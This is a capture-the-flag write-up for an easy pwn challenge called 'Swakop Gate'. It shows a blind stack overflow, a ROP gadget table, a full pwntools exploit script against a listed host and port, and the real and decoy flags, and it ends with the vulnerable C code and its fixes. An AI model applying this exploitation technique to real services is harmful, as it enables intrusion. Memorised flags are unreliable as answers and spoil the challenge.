# Swakop Gate

**Author:** John_x9  
**Difficulty:** Easy  
**Connect:** `nc 167.86.100.57:9001`

The Swakopmund road gate looks simple: one callsign prompt, one polite `hi`, done. Same energy as the NUST meetup signup desk. Type short, leave. Type long, and something behind the form bends. Wrong door prints a flag-shaped sticker. The real vault wants a magic key, not the decoy `win`.

---

## Blind solve path

You only have `nc`. No ELF. Work from what the service does.

### 1. Connect and feel the gate

```bash
nc 167.86.100.57 9001
```

Banner:

```text
=== Swakopmund Gate ===
callsign?
```

Send `bob`. You get `hi bob` and a clean exit. One prompt only.

### 2. Prove the overflow

Send a long run of `A`s (100-200 bytes). Short input exits politely. Long input drops the connection or never finishes cleanly. That is a classic **stack buffer overflow**: the read is bigger than the local callsign box, and there is **no canary** yelling at you.

### 3. Decoys on the coast

If you land on decoy `win`, you may see:

```text
nustCTF{c4ll1ng_w1n_w4s_t00_34sy_l0l}
```

Wrong magic into the real door:

```text
vault stays shut
nustCTF{w4rm_m4g1c_but_wr0ng_k3y}
```

Both are traps. CTFd rejects them. Keep going.

### 4. Goal

You want the process to execute:

```text
vault_open(0xc0ffee00001337)
```

On x86_64 that means a short **ROP** chain: load the magic into `rdi`, then jump to `vault_open` (not decoy `win`).

### 5. Addresses: honest note

This build is **no-PIE** (code addresses stay fixed for this deploy). The remote does **not** print gadgets or `vault_open`. Blind-guessing every address from `nc` alone is not practical.

Practical options:

1. Ask organizers for the matching binary (common when CTFd has no attachment).
2. Use the fixed build table below once published for this event.

| Piece | Address | Meaning |
|-------|---------|---------|
| `pop rdi; ret` | `0x4013ef` | Load first argument |
| plain `ret` | `0x40101a` | Stack alignment helper |
| `vault_open` | `0x4012a4` | Real door (opens `flag.txt` if magic matches) |
| decoy `win` | `0x40127b` | Trap. Do not use |

### 6. Payload layout

Saved RIP starts at offset **56** on this build (from the start of your callsign input). Against remote only, try nearby values like 48, 56, 64 if you are hunting without the binary.

```text
[56 bytes padding]
ret
pop rdi; ret
0xc0ffee00001337
vault_open
```

### 7. Working remote script

```python
#!/usr/bin/env python3
from pwn import *

HOST = '167.86.100.57'
PORT = 9001

POP_RDI = 0x4013ef
RET     = 0x40101a
VAULT   = 0x4012a4
MAGIC   = 0xc0ffee00001337

context.arch = 'amd64'
context.log_level = 'error'
io = remote(HOST, PORT)
io.recvuntil(b'callsign?')

payload = flat({
    56: [
        RET,
        POP_RDI,
        MAGIC,
        VAULT,
    ]
})
io.send(payload)
print(io.recvall(timeout=2).decode(errors='ignore'))
```

Same script lives at [`solves/01-swakop-solve.py`](solves/01-swakop-solve.py).

---

## Real flag

```text
nustCTF{sw4k0p_m4g1c_k3y_r0p}
```

---

## After the event: vulnerable code and how to fix

Vulnerable pattern (illustrative):

```c
void greet(void){
  char callsign[48];
  puts("=== Swakopmund Gate ===");
  puts("callsign?");
  read(0, callsign, 0x120);   /* 0x120 into a 48-byte buffer */
  printf("hi %s\n", callsign);
}
```

`read` size (`0x120`) is far larger than `callsign[48]`. Extra bytes overwrite saved frame data and the return address. No canary, no bounds check.

**Secure coding fixes:**

1. Bound the read to the buffer: `read(0, callsign, sizeof(callsign) - 1)` and NUL-terminate.
2. Prefer `fgets(callsign, sizeof callsign, stdin)` for line-oriented input.
3. Enable stack canaries (`-fstack-protector-strong`) and PIE so a smash alone is harder to weaponize.
4. Do not leave decoy "win" paths that print flag-shaped strings if that confuses operators in production; separate demo traps from real secret handling.
